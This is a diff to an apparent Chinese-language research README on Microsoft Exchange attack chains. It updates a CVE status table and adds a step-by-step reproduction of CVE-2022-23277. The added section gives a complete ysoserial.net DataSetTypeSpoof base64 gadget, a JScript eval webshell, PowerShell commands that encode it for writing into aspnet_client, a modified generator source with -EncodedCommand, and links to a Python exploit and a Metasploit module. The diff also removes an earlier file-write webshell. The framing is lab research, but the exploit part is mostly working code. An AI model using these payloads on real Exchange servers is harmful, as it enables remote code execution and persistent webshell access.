@@ -36,9 +36,10 @@ ProxyLogon is Just the Tip of the Iceberg: A New Attack Surface on Microsoft Exc
 | ProxyNotShell (completed) | [CVE-2022-41040](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-41040) | 2022年11月8日 | 服务端请求伪造(SSRF)漏洞 | yes |
 | ProxyNotShell (completed) | [CVE-2022-41082](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-41082) | 2022年11月8日 | 远程执行代码RCE漏洞 | yes |
 | ProxyNotRelay |  |  |  | yes |
+| CVE-2022-21969 | [CVE-2022-21969](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-21969) | Jan 11, 2022 | Deserialization Protection Bypasses RCE | yes |
 | OWASSRF(CVE-2022-41080) | [CVE-2022-41080]() |  |  | yes |
 | TabShell(CVE-2022-41076) | [CVE-2022-41076]() |  |  | yes |
-| CVE-2022-23277 (WIP) | [CVE-2022-23277](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-23277) | Mar 8, 2022 | 由于SerializationBinder的错误使用导致反序列化白名单的绕过，从而实现认证后RCE。触发漏洞的功能与CVE-2021-42321一致 | yes |
+| CVE-2022-23277 (completed) | [CVE-2022-23277](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-23277) | Mar 8, 2022 | 由于SerializationBinder的错误使用导致反序列化白名单的绕过，从而实现认证后RCE。触发漏洞的功能与CVE-2021-42321一致 | yes |
 | ProxyNotFound | [CVE-2021-28480](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-28480) | April 13, 2021 | Pre-auth SSRF/ACL bypass | no |
 | ProxyNotFound | [CVE-2021-28481](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-28481) | April 13, 2021 | Pre-auth SSRF/ACL bypass | no |
 | CVE-2023-21707 (test failed) | [CVE-2023-21707](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-21707) | 2023年3月9日 | Microsoft Exchange Server 远程执行代码漏洞 | yes |
@@ -392,6 +393,13 @@ Exchange Server 2016 CU21 <= Oct21SU 15.1.2308.15 15.01.2308.015
 Exchange Server 2019 CU11 <= Oct21SU 15.2.986.9 15.02.0986.009
 Exchange Server 2019 CU10 <= Oct21SU 15.2.922.14 15.02.0922.014
 ```
+
+ - 本地测试exchange环境(Exchange Server 2016 未安装任何安全更新):
+
+| 测试状态 | exchange版本 | File Name | 出版日期 | File Size |
+| ----------- | ----------- | ----------- | ----------- | ----------- |
+| 测试成功 | Exchange Server 2016 累计更新 22 (KB5005333) 15.01.2375.007 | ExchangeServer2016-x64-CU22.ISO | 2021/9/24 | 6.6 GB |
+
 
 ## 直接修改ysoserial.net为写入aspx webshell
 
@@ -1050,6 +1058,10 @@ root@fdvoid0:/mnt/d/1.recent-research/exchange/proxy-attackchain# python2 proxyn
 
  - [ProxyNotRelay - An Exchange Vulnerability](https://rw.md/2022/11/09/ProxyNotRelay.html)
 
+# CVE-2022-21969
+## CVE-2022-21969 part links
+
+ - [Searching for Deserialization Protection Bypasses in Microsoft Exchange (CVE-2022–21969)](https://medium.com/@frycos/searching-for-deserialization-protection-bypasses-in-microsoft-exchange-cve-2022-21969-bfa38f63a62d)
 
 
 
@@ -1065,7 +1077,7 @@ root@fdvoid0:/mnt/d/1.recent-research/exchange/proxy-attackchain# python2 proxyn
 
 
 
-# CVE-2022-23277 (WIP)
+# CVE-2022-23277 (completed)
 ## CVE-2022-23277 part links
 
  - [DotNet安全-CVE-2022-23277漏洞复现](https://mp.weixin.qq.com/s/lrlZiVH3QZI3rMRZwk_l6A)
@@ -1081,24 +1093,93 @@ root@fdvoid0:/mnt/d/1.recent-research/exchange/proxy-attackchain# python2 proxyn
  - [cve-2022-23277 PoC video](https://www.youtube.com/watch?v=b00oDvuDYU0)
  - [Note nhanh về BinaryFormatter binder và CVE-2022–23277](https://testbnull.medium.com/note-nhanh-v%E1%BB%81-binaryformatter-binder-v%C3%A0-cve-2022-23277-6510d469604c)
 
+.NET反序列化问题在2017年上升
 
-认证部分需要通过burpsuite手动添加，利用成功后会在aspnet_client写入1.aspx。
+ - [the remark "SerializationBinder can also be used for security" was added to the SerializationBinder documentation.](https://github.com/dotnet/dotnet-api-docs/blame/ca7d94d93ac693ef3a5d234cbceaf445cdc9ed35/xml/System.Runtime.Serialization/SerializationBinder.xml#L31)
 
- - webshell:
+ - [2020年微软修改了对SerializationBinder描述，和之前完全相反](https://github.com/dotnet/dotnet-api-docs/commit/7fa27b6f9504e24e071b7c0ea62710f9578f751f#diff-0b8845a039c9e5f799538d0a686cb70f597a79fb3b91069fcdc76a29b537a0a8)
+
+ - 漏洞仅仅影响下面几个特定安全更新的版本:
 
 ``` bash
-<%@ Page Language="JScript" Debug="true"%><%@Import Namespace="System.IO"%><%File.WriteAllBytes(Request["b"], Convert.FromBase64String(Request["a"]));%>
+'15.1.2308.20', # Exchange Server 2016 CU21 Nov21SU
+'15.1.2308.21', # Exchange Server 2016 CU21 Jan22SU
+'15.1.2375.17', # Exchange Server 2016 CU22 Nov21SU
+'15.1.2375.18', # Exchange Server 2016 CU22 Jan22SU
+'15.2.922.19', # Exchange Server 2019 CU10 Nov21SU
+'15.2.922.20', # Exchange Server 2019 CU10 Jan22SU
+'15.2.986.14', # Exchange Server 2019 CU11 Nov21SU
+'15.2.986.15'  # Exchange Server 2019 CU11 Jan22SU
 ```
 
+ - 本地测试exchange环境(Exchange Server 2016 安装15.01.2375.018安全更新):
 
+| 测试状态 | exchange版本 | File Name | 出版日期 | File Size |
+| ----------- | ----------- | ----------- | ----------- | ----------- |
+| 测试失败 | Exchange Server 2016 累计更新 22 (KB5005333) 15.01.2375.007 | ExchangeServer2016-x64-CU22.ISO | 2021/9/24 | 6.6 GB |
+| 测试成功 | Security Update For Exchange Server 2016 CU22 (KB5008631) 15.01.2375.018 | Exchange2016-KB5008631-x64-zh-hans.msp | 2022/1/11 | 151.2 MB |
 
+未更新KB5008631补丁包的原始CU22版本无法利用此漏洞，因为利用链在安全更新补丁包中
 
+该漏洞和之前的CVE-2021-42321漏洞利用exp的请求流程是一样的，只是新的DataSetTypeSpoof .net反序列化利用链绕过了安全更新
 
+1. 使用ysoserial.net的原始未修改的DataSetTypeSpoofGenerator.cs写入test.txt文件
 
+``` bash
+PS D:\1.recent-research\exchange\proxy-attackchain\ysoserial.net-modified\ysoserial\bin\Release> .\ysoserial.exe -g DataSetTypeSpoof -f BinaryFormatter -o base64 -c "echo fdvoid0 > C:\inetpub\wwwroot\aspnet_client\test.txt"
+AAEAAAD/////AQAAAAAAAAAMAgAAAAhtc2NvcmxpYgwDAAAATlN5c3RlbS5EYXRhLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQUBAAAAY1N5c3RlbS5EYXRhLkRhdGFTZXQsIFN5c3RlbS5EYXRhLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQoAAAAWRGF0YVNldC5SZW1vdGluZ0Zvcm1hdBNEYXRhU2V0LkRhdGFTZXROYW1lEURhdGFTZXQuTmFtZXNwYWNlDkRhdGFTZXQuUHJlZml4FURhdGFTZXQuQ2FzZVNlbnNpdGl2ZRJEYXRhU2V0LkxvY2FsZUxDSUQaRGF0YVNldC5FbmZvcmNlQ29uc3RyYWludHMaRGF0YVNldC5FeHRlbmRlZFByb3BlcnRpZXMURGF0YVNldC5UYWJsZXMuQ291bnQQRGF0YVNldC5UYWJsZXNfMAQBAQEAAAACAAcfU3lzdGVtLkRhdGEuU2VyaWFsaXphdGlvbkZvcm1hdAMAAAABCAEIAgIAAAAF/P///x9TeXN0ZW0uRGF0YS5TZXJpYWxpemF0aW9uRm9ybWF0AQAAAAd2YWx1ZV9fAAgDAAAAAQAAAAYFAAAAAAkFAAAACQUAAAAACQQAAAAKAQAAAAkGAAAADwYAAADIAwAAAgABAAAA/////wEAAAAAAAAADAIAAABeTWljcm9zb2Z0LlBvd2VyU2hlbGwuRWRpdG9yLCBWZXJzaW9uPTMuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNQUBAAAAQk1pY3Jvc29mdC5WaXN1YWxTdHVkaW8uVGV4dC5Gb3JtYXR0aW5nLlRleHRGb3JtYXR0aW5nUnVuUHJvcGVydGllcwEAAAAPRm9yZWdyb3VuZEJydXNoAQIAAAAGAwAAAOoFPD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTE2Ij8+DQo8T2JqZWN0RGF0YVByb3ZpZGVyIE1ldGhvZE5hbWU9IlN0YXJ0IiBJc0luaXRpYWxMb2FkRW5hYmxlZD0iRmFsc2UiIHhtbG5zPSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbC9wcmVzZW50YXRpb24iIHhtbG5zOnNkPSJjbHItbmFtZXNwYWNlOlN5c3RlbS5EaWFnbm9zdGljczthc3NlbWJseT1TeXN0ZW0iIHhtbG5zOng9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sIj4NCiAgPE9iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCiAgICA8c2Q6UHJvY2Vzcz4NCiAgICAgIDxzZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICAgICAgPHNkOlByb2Nlc3NTdGFydEluZm8gQXJndW1lbnRzPSIvYyBlY2hvIGZkdm9pZDAgJmd0OyBDOlxpbmV0cHViXHd3d3Jvb3RcYXNwbmV0X2NsaWVudFx0ZXN0LnR4dCIgU3RhbmRhcmRFcnJvckVuY29kaW5nPSJ7eDpOdWxsfSIgU3RhbmRhcmRPdXRwdXRFbmNvZGluZz0ie3g6TnVsbH0iIFVzZXJOYW1lPSIiIFBhc3N3b3JkPSJ7eDpOdWxsfSIgRG9tYWluPSIiIExvYWRVc2VyUHJvZmlsZT0iRmFsc2UiIEZpbGVOYW1lPSJjbWQiIC8+DQogICAgICA8L3NkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgIDwvc2Q6UHJvY2Vzcz4NCiAgPC9PYmplY3REYXRhUHJvdmlkZXIuT2JqZWN0SW5zdGFuY2U+DQo8L09iamVjdERhdGFQcm92aWRlcj4LCw==
+```
 
+2. 使用ysoserial.net的修改版DataSetTypeSpoofGenerator.cs写入shell文件
 
+ - webshell shell.txt:
 
+``` bash
+fd<script language="JScript" runat="server" Page aspcompat=true>function Page_Load(){eval(Request["cmd"],"unsafe");}</script>
+```
 
+使用powershell进行编码：
+
+``` bash
+PS D:\1.recent-research\exchange\proxy-attackchain\CVE-2022-23277-main> $file=Get-Content -Path shell.txt
+PS D:\1.recent-research\exchange\proxy-attackchain\CVE-2022-23277-main> $MyScript = "Set-Content -Path 'C:\inetpub\wwwroot\aspnet_client\0.aspx' -Value '$file'"
+PS D:\1.recent-research\exchange\proxy-attackchain\CVE-2022-23277-main> $MyEncodedScript = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($MyScript))
+PS D:\1.recent-research\exchange\proxy-attackchain\CVE-2022-23277-main> $MyEncodedScript
+UwBlAHQALQBDAG8AbgB0AGUAbgB0ACAALQBQAGEAdABoACAAJwBDADoAXABpAG4AZQB0AHAAdQBiAFwAdwB3AHcAcgBvAG8AdABcAGEAcwBwAG4AZQB0AF8AYwBsAGkAZQBuAHQAXAAwAC4AYQBzAHAAeAAnACAALQBWAGEAbAB1AGUAIAAnAGYAZAA8AHMAYwByAGkAcAB0ACAAbABhAG4AZwB1AGEAZwBlAD0AIgBKAFMAYwByAGkAcAB0ACIAIAByAHUAbgBhAHQAPQAiAHMAZQByAHYAZQByACIAIABQAGEAZwBlACAAYQBzAHAAYwBvAG0AcABhAHQAPQB0AHIAdQBlAD4AZgB1AG4AYwB0AGkAbwBuACAAUABhAGcAZQBfAEwAbwBhAGQAKAApAHsAZQB2AGEAbAAoAFIAZQBxAHUAZQBzAHQAWwAiAGMAbQBkACIAXQAsACIAdQBuAHMAYQBmAGUAIgApADsAfQA8AC8AcwBjAHIAaQBwAHQAPgAnAA==
+```
+
+然后将编码后的数据放入[DataSetTypeSpoofGenerator.cs](./CVE-2022-23277-main/ObjectDataProviderGenerator.cs)
+
+``` bash
+// psi.FileName = inputArgs.CmdFileName;
+if (inputArgs.HasArguments)
+{
+    // psi.Arguments = inputArgs.CmdArguments;
+}
+
+psi.FileName = "powershell.exe";
+psi.Arguments = " -EncodedCommand UwBlAHQALQBDAG8AbgB0AGUAbgB0ACAALQBQAGEAdABoACAAJwBDADoAXABpAG4AZQB0AHAAdQBiAFwAdwB3AHcAcgBvAG8AdABcAGEAcwBwAG4AZQB0AF8AYwBsAGkAZQBuAHQAXAAwAC4AYQBzAHAAeAAnACAALQBWAGEAbAB1AGUAIAAnAGYAZAA8AHMAYwByAGkAcAB0ACAAbABhAG4AZwB1AGEAZwBlAD0AIgBKAFMAYwByAGkAcAB0ACIAIAByAHUAbgBhAHQAPQAiAHMAZQByAHYAZQByACIAIABQAGEAZwBlACAAYQBzAHAAYwBvAG0AcABhAHQAPQB0AHIAdQBlAD4AZgB1AG4AYwB0AGkAbwBuACAAUABhAGcAZQBfAEwAbwBhAGQAKAApAHsAZQB2AGEAbAAoAFIAZQBxAHUAZQBzAHQAWwAiAGMAbQBkACIAXQAsACIAdQBuAHMAYQBmAGUAIgApADsAfQA8AC8AcwBjAHIAaQBwAHQAPgAnAA==";
+```
+
+将原始的DataSetTypeSpoofGenerator.cs的内容修改为如下所示:
+
+ - ![](pics/CVE-2022-23277-2.png)
+
+最后重新编译ysoserial.net得到可用gadget chain，放入python exp脚本中即可
+
+使用脚本一次性全部成功写入，虽然每次最后一步报连接错误...
+
+ - [cve-2022-23277-exp.py](./CVE-2022-23277-main/cve-2022-23277-exp.py)
+
+ - ![](pics/CVE-2022-23277.png)
+
+ - ![](pics/CVE-2022-23277-1.png)
+
+3. 使用metasploit的[Microsoft Exchange Server ChainedSerializationBinder RCE模块](./CVE-2022-23277-main/exchange_chainedserializationbinder_rce.rb)
+
+能成功检测，但是无法执行文件没有session返回。需要进一步修改文件执行功能
+
+ - ![](pics/CVE-2022-23277-0.png)
 
 
 # CVE-2023-21707 (反序列化远程代码执行) (test failed)
